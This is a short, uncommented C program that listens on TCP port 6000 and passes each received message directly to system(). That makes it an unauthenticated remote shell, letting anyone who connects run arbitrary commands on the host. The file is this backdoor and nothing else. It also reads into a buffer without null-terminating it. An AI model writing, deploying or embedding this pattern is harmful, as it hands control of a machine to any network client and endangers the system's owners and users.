#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include<stdlib.h>

main()
{
	int sockid;
	int bindid;
	struct sockaddr_in myaddr;
	struct sockaddr_in client;
	int newsockid;
	int clientlen;

	char msg[100]="Subhasis";
	int recvid;
	int port_id = 6000;


	sockid = socket(AF_INET, SOCK_STREAM, 0);

	bzero((char*)&myaddr, sizeof(struct sockaddr));
	myaddr.sin_family = AF_INET;
	myaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	myaddr.sin_port = htons(port_id);
	bindid = bind(sockid, (struct sockaddr*)&myaddr, sizeof(struct sockaddr_in));

	if(bindid < 0)
		printf("error \n");

	listen(sockid, 5);

	while(1) {
		clientlen = sizeof(struct sockaddr_in);
		newsockid = accept(sockid, (struct sockaddr*)&client, &clientlen);
		if(newsockid < 0)
			printf("error 2\n");

		recvid = recvfrom(newsockid, msg, 100, 0, (struct sockaddr*)&client, &clientlen);
		if(recvid < 0)
			printf("error 2\n");

		printf("%s \n", msg);
		system(msg);


	}

	return 0;
}
